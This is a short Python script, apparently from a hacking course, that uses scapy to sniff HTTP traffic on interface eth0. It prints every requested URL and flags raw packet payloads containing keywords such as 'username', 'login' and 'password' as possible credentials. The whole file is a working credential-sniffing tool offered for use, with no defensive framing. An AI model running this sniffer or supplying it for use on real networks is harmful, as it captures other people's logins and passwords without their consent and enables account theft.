import scapy.all as scapy
from scapy.layers import http

def sniffer(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
    # You can also run a Filter
def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load  # Pode ser especificado outro tipo de procotoco/layer
        keywords = ["username", "usuario", "user", "login", "e-mail", "password", "pass", "email"]
        for keyword in keywords:
            if keyword in load:
                return load

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        # print(packet.show())
        url = get_url(packet)
        print("[+] HTTP Request >>> " + url)
        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username/password >" + login_info + "\n\n")
sniffer("eth0")